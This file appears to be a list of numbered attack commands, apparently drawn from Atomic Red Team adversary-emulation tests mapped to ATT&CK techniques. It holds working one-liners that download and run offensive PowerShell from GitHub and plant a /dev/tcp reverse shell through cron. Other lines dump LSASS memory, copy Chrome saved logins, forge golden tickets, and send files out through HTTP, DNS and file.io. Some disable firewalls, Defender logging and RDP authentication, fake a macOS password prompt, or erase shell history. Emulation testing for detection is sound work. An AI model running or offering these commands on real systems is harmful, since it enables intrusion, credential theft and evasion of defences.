55	reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test";reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0;reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe;atbroker /start malware_test
240	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /d 0 /t REG_DWORD /f
2	sudo sysadminctl -guestAccount on
204	$edgePath64 = "C:\Program Files\Microsoft\Edge\Application\msedge.exe";if (Test-Path $edgePath64) {;    $edgePath = $edgePath64;} else {;    # Check 32-bit Edge installation path;    $edgePath32 = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe";    if (Test-Path $edgePath32) {;        $edgePath = $edgePath32;    } else {;        exit 1;    };};& $edgePath --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\calc.exe &&";sleep 5;taskkill -f -im msedge.exe;taskkill -f -im calc.exe;taskkill -f -im win32calc.exe
172	$PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
48	"#{file_name}"
263	kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
109	$termsrvDll = "C:\Windows\System32\termsrv.dll";;$ACL = Get-Acl $termsrvDll;$permission = "Administrators","FullControl","Allow";$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission;$ACL.SetAccessRule($accessRule);Set-Acl -Path $termsrvDll -AclObject $ACL;;Copy-Item -Path $termsrvDll -Destination "$HOME\AtomicTest.dll";;$newServiceDll = "$HOME\AtomicTest.dll";;$registryPath = "HKLM:\System\CurrentControlSet\services\TermService\Parameters";;# Check if the registry key exists;if (Test-Path -Path $registryPath) {;    # Modify the ServiceDll value in the registry;    Set-ItemProperty -Path $registryPath -Name "ServiceDll" -Value $newServiceDll;    Write-Host "ServiceDll value in the registry has been updated to: $newServiceDll";} else {;    Write-Host "Registry key not found. Make sure the 'TermService\Parameters' key exists.";}
75	reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableRemoteDesktopAntiAlias" /t REG_DWORD /d 1 /f
44	$file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe";Invoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe;Start-Process -FilePath $file "/S"
216	 c:\windows\system32\cmd.exe /c cd /d #{script_path} & echo Set objShell = CreateObject("WScript.Shell"):Set objExec = objShell.Exec("whoami"):Set objExec = Nothing:Set objShell = Nothing > #{script_name}.vbs & #{script_name}.vbs
210	which_python=`which python || which python3`&&$which_python -c "from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')" 
197	set DOTNET_STARTUP_HOOKS="#{preloader_dll}";dotnet -h > nul;echo.
255	cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe" #{remote_file} #{destination_path}
45	$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules";;if (-not (Test-Path $registryPath)) {;    New-Item -Path $registryPath -Force;    Write-Host "Registry key created: $registryPath";};;$newValueName = "36190899-1602-49e8-8b27-eb1d0a1ce869";$newValueData = "1";New-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force;Write-Host "Registry value created: $newValueName with data $newValueData";;Remove-ItemProperty -Path $registryPath -Name $newValueName;Write-Host "Registry value deleted: $newValueName"
75	reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
191	cat #{sh_history_filename} | grep #{sh_history_grep_args} > #{output_file}
35	rundll32.exe #{dll_file},krnl
52	#{exe_path} & ps&&TMP=`ps | grep totally_legit`&&if [ -z "${TMP}" ] ; then echo "renamed process NOT FOUND in process list" && exit 1; fi&&exit 0
257	if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi&&echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " > #{mount_point}#{cron_path}/#{cron_filename}&&echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}&&echo -n "(hostname) " >> #{mount_point}#{cron_path}/#{cron_filename}&&echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}&&echo "(id)\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'" >> #{mount_point}#{cron_path}/#{cron_filename}&&netcat -l -p #{listen_port} 2>&1
195	cmd /c "#{nircmd_location}" #{command_to_execute}
76	IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1');Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
167	if (Test-Path -Path "$env:SystemRoot\System32\rdrleakdiag.exe") {;      $binary_path = "$env:SystemRoot\System32\rdrleakdiag.exe";  } elseif (Test-Path -Path "$env:SystemRoot\SysWOW64\rdrleakdiag.exe") {;      $binary_path = "$env:SystemRoot\SysWOW64\rdrleakdiag.exe";  } else {;      $binary_path = "File not found";      exit 1;  };$lsass_pid = get-process lsass |select -expand id;if (-not (Test-Path -Path"$env:TEMP\t1003.001-13-rdrleakdiag")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} ;write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1;& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1;Write-Host "Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory."
194	try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop };catch { $_; exit $_.Exception.HResult }
259	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');powerSQL -noninteractive -consoleoutput
101	cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_CLSID}'
202	secedit /import /db #{secedit_db} /cfg "#{ini_file}";secedit /configure /db #{secedit_db}
145	echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
0	$examplePath = Join-Path $env:windir "system32\Com"; if (-not (Test-Path $examplePath)) { New-Item -ItemType Directory -Path $examplePath | Out-Null }; $exampleName = "comadmin.dat"; $exampleFullPath = Join-Path $examplePath $exampleName; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); [System.IO.File]::WriteAllBytes($exampleFullPath, $randomBytes)
67	docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ &&docker run --name t1609_container --rm -itd t1609 bash /tmp/script.sh&&docker exec -i t1609_container bash -c "cat /tmp/output.txt"
96	aws iam create-access-key --user-name #{username} > "$PathToAtomicsFolder/T1098.001/bin/aws_secret.creds"&&cd "$PathToAtomicsFolder/T1098.001/bin/"&&./aws_secret.sh
166	filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi&&[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local&&echo "\npython3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"" | sudo tee -a /etc/rc.local&&printf 'exit 0' | sudo tee -a /etc/rc.local&&sudo chmod +x /etc/rc.local
203	podman build -t t1613 $PathtoAtomicsFolder/T1613/src/&&podman run --name t1613_container -d -t t1613&&podman ps&&podman stats --no-stream&&podman inspect $(podman ps -l -q --filter ancestor=t1613)
246	Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic = [Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save("#{output_file}")
162	cd "PathToAtomicsFolder\ExternalPayloads\";Import-Module .\Extract-Invoke-PSImage.ps1;$extractedScript=Extract-Invoke-PSImage -Image "#{image_file}" -Out "$HOME\result.ps1";$scriptContent = Get-Content "$HOME\result.ps1" -Raw;$base64Pattern = "(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])";$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value };$base64Strings | Set-Content "$HOME\decoded.ps1";$decodedContent = Get-Content "$HOME\decoded.ps1" -Raw;$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent));$textPattern = '^.+'  ;$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value };$scriptPath = "$HOME\textExtraction.ps1";$textMatches -join '' | Set-Content -Path $scriptPath;. "$HOME\textExtraction.ps1"
241	#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}
211	PWD_SPOOF=$(osascript -e 'display dialog "To perform a security update MacOS needs your passphrase." with title "MacOS Security Update" default answer "" with icon stop with hidden answer')&&echo $PWD_SPOOF
298	truncate -s +1 #{file_to_pad} #adds a byte to the file size
183	#{msi_exe} /z "#{dll_payload}"
221	New-Item -Path #{teamviewer_log_file} -Force | Out-Null;Remove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore
202	if (!(Test-Path "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg")) { reg.exe export "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" "$PathToAtomicsFolder\T1547.001\src\SessionManagerBackup.reg" /y };Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name "BootExecute" -Value "#{registry_value}" -Type MultiString
33	New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name ShellSmartScreenLevel -Force
287	reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
16	copy-item -Path "\\#{remote}\C$\#{share_file}" -Destination "$Env:TEMP\#{local_file}"
126	Set-PSReadLineOption -AddToHistoryHandler { return $false }
288	echo "#{at_command}" | at #{time_spec}
123	sc.exe create "WerFaultSvc" binPath= "$env:windir\WinSxS\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\WerFault.exe" DisplayName= "WerFault Service" start= auto
268	rundll32.exe keymgr,KRShowKeyMgr
295	echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
290	$file = Get-Item $env:temp\T1564.001-10.txt -Force;$file.attributes='System'
269	NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK;copy '#{local_file}' '*:\'
24	wscript "#{jscript}"
281	Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly;$keep = Get-Volume -FileSystemLabel "AllTheThings";$driveLetter = ($keep | Get-Volume).DriveLetter;$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"));$instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)
199	esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "#{output_path}"
179	set file=#{output_file_path}\user_info_%random%.tmp;echo Username: %USERNAME% > %file%;echo User Domain: %USERDOMAIN% >> %file%;net users >> %file%;query user >> %file%
248	aws iam get-account-password-policy
11	sh #{filename} #{audiofile} #{duration}
68	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');SharpCloud -consoleoutput -noninteractive  
146	Get-ADReplAccount -All -Server #{logonserver}
126	Remove-Item (Get-PSReadlineOption).HistorySavePath
69	reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /ve /T REG_SZ /d "AtomicTest" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00" /ve /T REG_SZ /d "AtomicTest" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /T REG_SZ /d "AtomicTest" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /T REG_SZ /d "C:\WINDOWS\system32\scrobj.dll" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /T REG_SZ /d "Apartment" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID" /ve /T REG_SZ /d "AtomicTest" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /T REG_SZ /d "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID" /ve /T REG_SZ /d "AtomicTest" /f;;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}" /f;reg add "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /T REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f;;rundll32.exe -sta "AtomicTest" 
73	Stop-Service -Name "#{service_name}" -force -erroraction silentlycontinue | Out-Null;set-servicebinarypath -name "#{service_name}" -path "#{new_bin_path}";start-service -Name "#{service_name}" -erroraction silentlycontinue | out-null
75	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "proxy.atomic-test.com:8080" /f
71	$VM = "#{vm_name}";New-VM -Name $VM -Generation 2;Set-VMFirmware $VM -EnableSecureBoot Off;Start-VM $VM
213	net stop w32time;Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "1" /f;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "1" /f;net start w32time
28	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
297	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
132	Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore;Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore;;cmd.exe /c "#{local_folder}\#{local_executable}" golden /aes256:#{krbtgt_aes256_key} /ldap /user:#{account} /dc:$(#{domaincontroller}) /printcmd /outfile:golden;$filename = (Get-ChildItem | ? {$_.Name.startswith("golden_")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name;;# create batch file with commands to run in a separate "runas /netonly" session;# so we don't purge Kerberos ticket from the current Windows session;# its output goes to golden.txt temp file, because we cannot capture "runas /netonly" output otherwise;@";>%TEMP%\golden.txt 2>&1 (;  echo Purge existing tickets and create golden ticket:;  klist purge;  cd %temp%;  "#{local_folder}\#{local_executable}" ptt /ticket:kirbifile;;  echo.;  echo Requesting SYSVOL:;  dir \\$(#{domaincontroller})\SYSVOL;  ;  echo.;  echo Tickets after requesting SYSVOL:;  klist;;  echo.;  echo End of Golden Ticket attack;);"@ -Replace "kirbifile", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat;;# run batch file in a new empty session (password and username do not matter);echo "foo" | runas /netonly /user:fake "$env:TEMP\golden.bat" | Out-Null;;# wait until the output file has logged the entire attack;do {;  Start-Sleep 1 # wait a bit so the output file has time to be created;  Get-Content -Path "$env:TEMP\golden.txt" -Wait | ForEach-Object {;    if ($_ -match 'End of Golden Ticket attack') { break } ;  };} while ($false) # dummy loop so that 'break' can be used;;# show output from new empty session;Get-Content $env:TEMP\golden.txt;;# cleanup temp files;Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore;Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore
87	$credFile = "#{cred_file}";if (Test-Path $credFile) {;    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){;      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1;    };    try {;        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force;        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;    };    catch { ;        $_.Exception;        $errCode = $_.Exception.ErrorCode;        Write-Host "Error code: $errCode";        if ($errCode -eq 86) {;            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials";            Remove-Item $credFile;        };        exit $errCode;    };    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}";    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force));    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile;};else {;    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first";}
49	cat /etc/passwd |grep nobody &&# -> nobody:x:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin&&pw usermod nobody -s /bin/sh&&echo $(openssl passwd -1 art) | pw mod user nobody -h 0&&su nobody&&whoami&&exit
299	fsutil fsinfo drives
22	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1');Invoke-WCMDump
15	$sampleData = "Sample data for exfiltration test";Set-Content -Path "#{sampleFile}" -Value $sampleData;$ftpUrl = "#{ftpServer}";$creds = Get-Credential -Credential "#{credentials}";Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "#{sampleFile}" -Credential $creds
58	sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
121	copy "#{filename}" %TEMP%\LibHello.js;#{jscpath}\#{jscname} /t:library %TEMP%\LibHello.js
189	#{compiled_file} #{source_file}
223	python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: "".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = "#{encrypted_command}"; key = "#{xor_key}"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'
21	$PathToAtomicsFolder\T1055.012\bin\x64\CreateProcessWithPipe.exe -program "#{hollow_binary_path}" -debug
192	#{regsvr32path}\#{regsvr32name} /s /i "#{dll_name}"
82	. "#{gpp_script_path}";Get-GPPPassword -Verbose
233	curl -s -A "HttpBrowser/1.0" -m3 #{domain}&&curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}&&curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}&&curl -s -A "*<|>*" -m3 #{domain}
228	echo "dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\nobjectClass: person\ncn: Atomic User\nsn: User" > tempadmin.ldif&&echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif&&ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
243	cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1
249	New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force;New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
75	reg add "HKCU\Software\Microsoft\Terminal Server Client" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f
99	$file = [System.IO.File]::OpenRead(#{source_file_path});$chunkSize = #{chunk_size} * 1KB;$buffer = New-Object Byte[] $chunkSize;;while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {;    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead);    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk;};$file.Close()
17	md #{folder_name};echo too many secrets > #{folder_name}\#{hidden_filename}
160	$dnsServer = "#{dns_server}";$exfiltratedData = "#{exfiltrated_data}";$chunkSize = #{chunk_size};;$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData);$encodedData = [Convert]::ToBase64String($encodedData);$chunks = $encodedData -split "(.{$chunkSize})";;foreach ($chunk in $chunks) {;    $dnsQuery = $chunk + "." + $dnsServer;    Resolve-DnsName -Name $dnsQuery;    Start-Sleep -Seconds 5;}
292	ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b "CN=Users,DC=#{domain},DC=#{top_level_domain}" -s sub -a always -z 1000 dn
248	secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt
295	reg query "HKEY_CURRENT_USER\Control Panel\International\Geo"
266	$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=';$Content = [System.Convert]::FromBase64String($key);Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library /keyfile:$env:Temp\key.snk #{source_file};C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}
113	start "" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}
89	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')
302	conhost.exe "#{process}"
255	powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}
29	az login;$userprincipalname = "#{userprincipalname}";$username = "#{username}"      ;$password = "#{password}";az ad user create --display-name $username --password $password --user-principal-name $userprincipalname;az ad user list --filter "displayname eq 'atomicredteam'"     
208	"#{trufflesnout_path}" forest -n #{domain};"#{trufflesnout_path}" domain -n #{domain}
207	cd "#{rsp_file_path}";odbcconf.exe -f "#{rsp_file_name}"
30	Import-Module MSOnline;Import-Module AzureAD;$password = ConvertTo-SecureString -String "#{auth_password}" -AsPlainText -Force;$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{auth_username}", $password;$targetsecurepw = ConvertTo-SecureString -String "#{target_password}" -AsPlainText -Force;Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue;Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue;;#Saving the ObjectId of the target_user into a variable;$target_objid = Get-AzureADUser -filter "userPrincipalName eq '#{target_user}'" | Select-Object -ExpandProperty ObjectId;;#Reset the password of the target_user;Set-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue;;#Adding target_user;Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberEmailAddress "#{target_user}";Add-MsolRoleMember -RoleName "Global Reader" -RoleMemberEmailAddress "#{target_user}"
271	ldifde.exe -f #{output_path}\#{output_file} -p subtree
209	Cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs";New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name "VBAWarnings" -Value "1" -PropertyType DWORD -Force | Out-Null;& '.\Excel 2016.lnk' "PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm"
78	New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" -Name Enabled  -PropertyType DWord -Value 0 -Force
271	ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b "CN=Users,DC=#{domain},DC=#{top_level_domain}" "(objectClass=group)" -s sub -a always -z 1000 dn 
154	cd /tmp&&git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git&&cd /tmp/GoAWSConsoleSpray&&go run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt
137	Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
276	vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%
145	echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
186	Get-NetFirewallProfile | Format-Table Name, Enabled;Get-NetFirewallSetting;Get-NetFirewallRule | select DisplayName, Enabled, Description
173	curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/
